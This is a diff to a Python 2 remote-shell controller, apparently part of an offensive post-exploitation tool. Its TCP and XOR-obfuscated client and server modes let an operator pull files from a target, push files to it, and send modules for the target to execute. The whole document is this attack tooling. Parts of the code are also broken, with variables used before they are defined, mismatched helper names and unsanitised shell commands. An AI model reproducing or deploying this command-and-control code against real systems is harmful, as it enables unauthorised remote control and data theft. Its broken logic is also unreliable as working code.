@@ -25,8 +25,7 @@ class tcp:
             print("[+] File saved: %s" % location)
             core.logging.info("[%s] File '%s' download sucessful." % (session, filename))
         else:
-            print("[!] Error saving file: %s" % location)
-            core.logging.info("[%s] File '%s' download failed." % (session, filename))
+            core.downloaderr(filename, session)
             
             
     def upload(self, filename):
@@ -37,7 +36,7 @@ class tcp:
             conn.sendall(filedata)
             core.logging.info("[%s] File '%s' upload sucessful." % (session, filename))
         else:
-            print("[!] File not found!")
+            core.uploaderr(filename, session)
         
         
     def client(self, HOST, PORT):
@@ -58,9 +57,8 @@ class tcp:
                 if data.startswith(":savef"):
                     dfile = core.get_choice(data)
                     if dfile != "":
-                        core.logging.info("Saving %s " % dfile)
                         self.download(dfile, sessiondir)
-                    except IndexError:
+                    else:
                         core.logging.error("[%s] No file provided for [:savef] command" % session)
                 
                 elif data == ("Complete"):
@@ -81,7 +79,7 @@ class tcp:
                             self.download(dfile, sessiondir)
                             self.handle(conn)
                         else:
-                            print("[!] must specify file!")
+                            core.inputerr()
                     
                     elif cmd.startswith(":upload"):
                         fname = core.get_choice(cmd)
@@ -89,7 +87,7 @@ class tcp:
                             self.upload(fname)
                             self.handle(conn)
                         else:
-                            print("[!] must specify file!")
+                            core.inputerr()
                     
                     elif cmd.startswith(":exec"):
                         modname = core.get_choice(cmd)
@@ -107,7 +105,7 @@ class tcp:
                                 print("[!] module not found!")
                             
                         else:
-                            print("[!] must specify module name!")
+                            core.inputerr()
                         
                     elif cmd == (":help"):
                         core.shell_help()
@@ -117,7 +115,7 @@ class tcp:
                         if modname != "":
                             core.module_info(modname)
                         else:
-                            print("[!] must specify module name!")
+                            core.inputerr()
                                 
                     elif cmd == (":mods"):
                         print("[+] Available Modules: ")
@@ -125,7 +123,7 @@ class tcp:
                         
                     elif cmd == (":files"):
                         print("\n[+] Contents of Storage directory: ")
-                        os.system("ls %s | grep %s" % (sessiondir, name))
+                        os.system("ls %s" % sessiondir)
                     
                     elif cmd == (":quit"):
                         print("[!] Closing shell connection.")
@@ -138,13 +136,14 @@ class tcp:
             conn.close()
 
         except:
-            print("[!] Connection error!")
-            core.logging.error("[%s] Connection failed %s:%s" % (session, HOST, PORT))        
+            core.socketerr(session)        
                 
             
     def server(self, HOST, PORT):
         server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
         server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR,1)
+        session = ("TCP_"+HOST)
+        
         try:
             server.bind((HOST, int(PORT)))
             server.listen(5)
@@ -152,7 +151,7 @@ class tcp:
             global conn
             conn, addr = server.accept()
             print("New Connection!")
-            core.logging.info("Connection established to %s:%s" % (HOST, PORT))
+            core.logging.info("[%s] Connection established => %s:%s" % (session, HOST, PORT))
             
             while True:
                 data = conn.recv(socksize)
@@ -160,10 +159,10 @@ class tcp:
                 if data.startswith(":savef"):
                     dfile = core.get_choice(data)
                     if dfile != "":
-                        core.logging.info("Saving %s " % dfile)
+                        core.logging.info("[%s] Saving %s " % (session, dfile))
                         self.download(dfile, sessiondir)
-                    except IndexError:
-                        core.logging.error("[%s] No file provided for [:savef] command" % session)
+                    else:
+                        core.logging.info("[%s] No file specified for :savef" % session)
                 
                 elif data == ("Complete"):
                     print "[+] Executing module on target..."
@@ -181,17 +180,15 @@ class tcp:
                         dfile = core.get_choice(cmd)
                         if dfile != "":
                             self.download(dfile, sessiondir)
-                            self.handle(conn)
                         else:
-                            print("[!] must specify file!")
+                            core.inputerr()
                     
                     elif cmd.startswith(":upload"):
                         fname = core.get_choice(cmd)
                         if fname != "":
                             self.upload(fname)
-                            self.handle(conn)
                         else:
-                            print("[!] must specify file!")
+                            core.inputerr()
                     
                     elif cmd.startswith(":exec"):
                         modname = core.get_choice(cmd)
@@ -209,7 +206,7 @@ class tcp:
                                 print("[!] module not found!")
                             
                         else:
-                            print("[!] must specify module name!")
+                            core.inputerr()
                         
                     elif cmd == (":help"):
                         core.shell_help()
@@ -219,7 +216,7 @@ class tcp:
                         if modname != "":
                             core.module_info(modname)
                         else:
-                            print("[!] must specify module name!")
+                            core.inputerr()
                                 
                     elif cmd == (":mods"):
                         print("[+] Available Modules: ")
@@ -227,11 +224,11 @@ class tcp:
                         
                     elif cmd == (":files"):
                         print("\n[+] Contents of Storage directory: ")
-                        os.system("ls %s | grep %s" % (sessiondir, name))
+                        os.system("ls %s" % sessiondir)
                     
                     elif cmd == (":quit"):
                         print("[!] Closing shell connection.")
-                        core.logging.info("Closing connection to %s" % name)
+                        core.logging.info("[%s] Closing connection." % session)
                         conn.close()
                     
                 elif data:
@@ -240,8 +237,7 @@ class tcp:
             conn.close()
 
         except:
-            print("[!] Connection error!")
-            core.logging.error("[%s] Connection failed %s:%s" % (session, HOST, PORT)) 
+            core.socketerr(session) 
 
 
 
@@ -259,16 +255,19 @@ class xor:
         return data
         
            
-    def download(self, filename, session):
+    def download(self, filename, location):
+        # downloads file from remote system
+        # saves under location/filename (location should be sessiondir)
         filename = filename.replace("/","_")
         data = conn.recv(socksize)
-        newfile = file(core.DownloadDir+session+"-"+filename, "wb")
+        newfile = file(location+filename, "wb")
         newfile.write(data)
         newfile.close()
-        if os.path.exists(core.DownloadDir+session+"-"+filename):
-            print("[+] File saved: %s" % core.DownloadDir+session+"-"+filename)
+        if os.path.exists(location):
+            print("[+] File saved: %s" % location)
+            core.logging.info("[%s] File '%s' download sucessful." % (session, filename))
         else:
-            print("[!] Error saving file: %s" % core.DownloadDir+session+"-"+filename)
+            core.downloaderr(filename, session)
             
             
     def upload(self, filename):
@@ -277,113 +276,109 @@ class xor:
             filedata = sendfile.read()
             sendfile.close()
             conn.sendall(filedata)
+            core.logging.info("[%s] File '%s' upload sucessful." % (session, filename))
         else:
-            print("[!] File not found!")
+            core.uploaderr(filename, session)
             
             
-    def client(self, HOST, PORT, name, pkey):
-        global pin
-        pin = pkey
+    def client(self, HOST, PORT, pin):
+        session = ("XOR_"+HOST)
         conn = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
         
         try:
             conn.connect((HOST, PORT))
+            sessiondir = (core.DownloadDir+session)
+            os.mkdir(sessiondir)
             print("[+] Connection established!")
             print("[+] Type :help to view commands")
-            core.logging.info("New connection established to %s" % name)
-        except:
-            print("[!] Connection error!")
-            core.logging.info("Connection established to %s:%s" % (HOST, PORT))
+            core.logging.info("[%s] Connection established => %s:%s" % (session, HOST, PORT))
         
-        while True:
-            xdata = conn.recv(socksize)
-            data = self.enc(xdata, pin)
+            while True:
+                xdata = conn.recv(socksize)
+                data = self.enc(xdata, pin)
             
-            if data.startswith(":savef"):
-                try:
-                    getname = data.split(" ")
-                    dfile = getname[1]
-                    core.logging.info("Saved file %s from %s" % (dfile, name))
-                    self.download(dfile, name)
-                except IndexError:
-                    core.logging.info("No filename provided for [:savef] command.")
-
-            elif data == ("Complete"):
-                print "[+] Module transfer successful."
-                print "[+] Executing module on target..."
-                
-            elif data == "shell => ":
-                cmd = raw_input(data)
-                xcmd = self.enc(cmd, pin)
-                conn.sendall(xcmd)
-                
-                if cmd == (":killme"):
-                    print("[!] Shutting down server!")
-                    conn.close()
-                    
-                elif cmd == (":quit"):
-                    print("[!] Closing shell connection!")
-                    conn.close()
-                    
-                elif cmd.startswith(":download"):
-                    dfile = core.get_choice(cmd)
+                if data.startswith(":savef"):
+                    dfile = core.get_choices(data)
                     if dfile != "":
-                        self.download(dfile)
+                        self.download(dfile, sessiondir)
                     else:
-                        print("[!] must specify file!")
+                        core.logging.info("[%s] No file given for :savef" % session)
+
+                elif data == ("Complete"):
+                    print "[+] Module transfer successful."
+                    print "[+] Executing module on target..."
+                
+                elif data == "shell => ":
+                    cmd = raw_input(data)
+                    xcmd = self.enc(cmd, pin)
+                    conn.sendall(xcmd)
+                
+                    if cmd == (":killme"):
+                        print("[!] Shutting down server!")
+                        conn.close()
                     
-                elif cmd.startswith(":upload"):
-                    fname = core.get_choice(cmd)
-                    if fname != "":
-                        self.upload(fname)
-                    else:
-                        print("[!] must specify upload file!")
+                    elif cmd == (":quit"):
+                        print("[!] Closing shell connection!")
+                        conn.close()
                     
-                elif cmd.startswith(":exec"):
-                    modname = core.get_choice(cmd)
-                    if modname != "":
-                        if os.path.exists(ModulesDir+modname):
-                            sendfile = open(ModulesDir+modname, "rb")         # read the file into buffer
-                            filedata = sendfile.read()
-                            sendfile.close()
-                            time.sleep(3)
-                            filedata = b64encode(filedata)                  # base64 encode file and send to server
-                            conn.sendall(filedata)
-                            data = conn.recv(socksize)                    # wait to receive the OK msg from server
+                    elif cmd.startswith(":download"):
+                        dfile = core.get_choice(cmd)
+                        if dfile != "":
+                            self.download(dfile, sessiondir)
                         else:
-                            print("[!] module not found!")
-                    else:
-                        print("[!] must specify module name!")
-                        
-                elif cmd == (":help"):
-                    core.shell_help()
+                            core.inputerr()
                     
-                elif cmd.startswith(":info"):
-                    modname = core.get_choice(cmd)
-                    if modname != "":
-                        core.module_info(modname)
-                    else:
-                        print("[!] must specify module name!")
+                    elif cmd.startswith(":upload"):
+                        fname = core.get_choice(cmd)
+                        if fname != "":
+                            self.upload(fname)
+                        else:
+                            core.inputerr()
+                    
+                    elif cmd.startswith(":exec"):
+                        modname = core.get_choice(cmd)
+                        if modname != "":
+                            if os.path.exists(ModulesDir+modname):
+                                sendfile = open(ModulesDir+modname, "rb")         # read the file into buffer
+                                filedata = sendfile.read()
+                                sendfile.close()
+                                time.sleep(3)
+                                filedata = b64encode(filedata)                  # base64 encode file and send to server
+                                conn.sendall(filedata)
+                                data = conn.recv(socksize)                    # wait to receive the OK msg from server
+                            else:
+                                print("[!] module not found!")
+                        else:
+                            core.inputerr()
+                        
+                    elif cmd == (":help"):
+                        core.shell_help()
+                    
+                    elif cmd.startswith(":info"):
+                        modname = core.get_choice(cmd)
+                        if modname != "":
+                            core.module_info(modname)
+                        else:
+                            core.inputerr()
                                 
-                elif cmd == (":mods"):
-                    print("[+] Available Modules: ")
-                    print core.Modules
+                    elif cmd == (":mods"):
+                        print("[+] Available Modules: ")
+                        print core.Modules
                         
-                elif cmd == (":files"):
-                    print("\n[+] Contents of Storage directory: ")
-                    os.system("ls %s" % Download_Dir)
-                    
-                    
-            elif data:
-                print data
+                    elif cmd == (":files"):
+                        print("\n[+] Contents of Storage directory: ")
+                        os.system("ls %s" % sessiondir)
+                        
+                elif data:
+                    print data
                 
-        conn.close()
+            conn.close()
         
-                
-            
-    def server(self, HOST, PORT, name, pkey):
-        global pin
-        pin = pkey
+        except:
+            core.socketerr(session)
+
+
+    def server(self, HOST, PORT, pin):
         server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
         
         try:
@@ -393,117 +388,91 @@ class xor:
             global conn
             conn, addr = server.accept()
             print("New Connection!")
-            core.logging.info("Connection to local listener established: %s, %s" % (conn, addr)) 
-            self.handle(conn, name)
-        except:
-            print("[!] Connection error!")
-            core.logging.error("Listener failed to bind %s:%s" % (HOST, PORT))
+            core.logging.info("[%s] Connection established => %s:%s" % (session, HOST, PORT))
+        
+            while True:
+                xdata = conn.recv(socksize)
+                data = self.enc(xdata, pin)
             
-        while True:
-            xdata = conn.recv(socksize)
-            data = self.enc(xdata, pin)
-            
-            if data.startswith(":savef"):
-                try:
-                    getname = data.split(" ")
-                    dfile = getname[1]
-                    core.logging.info("Saved file %s from %s" % (dfile, name))
-                    self.download(dfile, name)
-                except:
-                    core.logging.error("No filename provided for [:savef] command.")
-                
-            elif data == ("Complete"):
-                print "[+] Module transfer successful."
-                print "[+] Executing module on target..."
-                
-            elif data == "shell => ":
-                cmd = raw_input(data)
-                xcmd = self.enc(cmd, pin)
-                conn.sendall(xcmd)
-                
-                if cmd == (":killme"):
-                    print("[!] Shutting down server!")
-                    conn.close()
-                    
-                elif cmd == (":quit"):
-                    print("[!] Closing shell connection!")
-                    conn.close()
-                    
-                elif cmd.startswith(":download"):
-                    dfile = core.get_choice(cmd)
+                if data.startswith(":savef"):
+                    dfile = core.get_choices(data)
                     if dfile != "":
-                        self.download(dfile)
+                        self.download(dfile, sessiondir)
                     else:
-                        print("[!] must specify file!")
-                    
-                elif cmd.startswith(":upload"):
-                    fname = core.get_choice(cmd)
-                    if fname != "":
-                    try:
-                        getname = cmd.split(" ")
-                        loc_file = getname[1]
-                        self.upload(loc_file)
-                    except IndexError:
-                        print("[!] Must specify upload file!")
-                    
-                elif cmd.startswith(":exec"):
-                    try:
-                        getname = cmd.split(" ")
-                        modname = getname[1]
-                    
-                        if os.path.exists(ModulesDir+modname):
-                            sendfile = open(ModulesDir+modname, "rb")         # read the file into buffer
-                            filedata = sendfile.read()
-                            sendfile.close()
-                            time.sleep(3)
-                            filedata = b64encode(filedata)                  # base64 encode file and send to server
-                            conn.sendall(filedata)
-                            data = conn.recv(socksize)                    # wait to receive the OK msg from server
-                        else:
-                            pass
-                        
-                    except IndexError:
-                        print("[!] Must specify module name!")
-                        
-                elif cmd == (":help"):
-                    core.shell_help()
-                    
-                elif cmd.startswith(":info"):
-                    try:
-                        getname = cmd.split(" ")
-                        modname = getname[1]
+                        core.logging.info("[%s] No file given for :savef" % session)
 
-                        if os.path.exists(core.ModulesDir+modname):
-                            info = open(core.ModulesDir+modname)
-                            for line in info:
-                                if "@description" in line:
-                                    split = line.split(":")
-                                    des = split[1]
-                                    print("\nDescription: %s " % des)
-                                if "@author" in line:
-                                    split = line.split(":")
-                                    author = split[1]
-                                    print("Author: %s " % author)              
-                                else:
-                                    pass
-                    
-                    except IndexError:
-                        print("[!] Must specify module name!")
-                                
-                elif cmd == (":mods"):
-                    print("[+] Available Modules: ")
-                    print Modules
-                        
-                elif cmd == (":files"):
-                    print("\n[+] Contents of Storage directory: ")
-                    os.system("ls %s" % Download_Dir)
-                    
-                    
-            elif data:
-                print data
+                elif data == ("Complete"):
+                    print "[+] Module transfer successful."
+                    print "[+] Executing module on target..."
                 
-        conn.close()
-
+                elif data == "shell => ":
+                    cmd = raw_input(data)
+                    xcmd = self.enc(cmd, pin)
+                    conn.sendall(xcmd)
+                
+                    if cmd == (":killme"):
+                        print("[!] Shutting down server!")
+                        conn.close()
+                    
+                    elif cmd == (":quit"):
+                        print("[!] Closing shell connection!")
+                        conn.close()
+                    
+                    elif cmd.startswith(":download"):
+                        dfile = core.get_choice(cmd)
+                        if dfile != "":
+                            self.download(dfile, sessiondir)
+                        else:
+                            core.inputerr()
+                    
+                    elif cmd.startswith(":upload"):
+                        fname = core.get_choice(cmd)
+                        if fname != "":
+                            self.upload(fname)
+                        else:
+                            core.inputerr()
+                    
+                    elif cmd.startswith(":exec"):
+                        modname = core.get_choice(cmd)
+                        if modname != "":
+                            if os.path.exists(ModulesDir+modname):
+                                sendfile = open(ModulesDir+modname, "rb")         # read the file into buffer
+                                filedata = sendfile.read()
+                                sendfile.close()
+                                time.sleep(3)
+                                filedata = b64encode(filedata)                  # base64 encode file and send to server
+                                conn.sendall(filedata)
+                                data = conn.recv(socksize)                    # wait to receive the OK msg from server
+                            else:
+                                print("[!] module not found!")
+                        else:
+                            core.inputerr()
+                        
+                    elif cmd == (":help"):
+                        core.shell_help()
+                    
+                    elif cmd.startswith(":info"):
+                        modname = core.get_choice(cmd)
+                        if modname != "":
+                            core.module_info(modname)
+                        else:
+                            core.inputerr()
+                                
+                    elif cmd == (":mods"):
+                        print("[+] Available Modules: ")
+                        print core.Modules
+                        
+                    elif cmd == (":files"):
+                        print("\n[+] Contents of Storage directory: ")
+                        os.system("ls %s" % sessiondir)
+                        
+                elif data:
+                    print data
+                
+            conn.close()
+        
+        except:
+            core.socketerr(session)
 
 tcp = tcp()
 xor = xor()
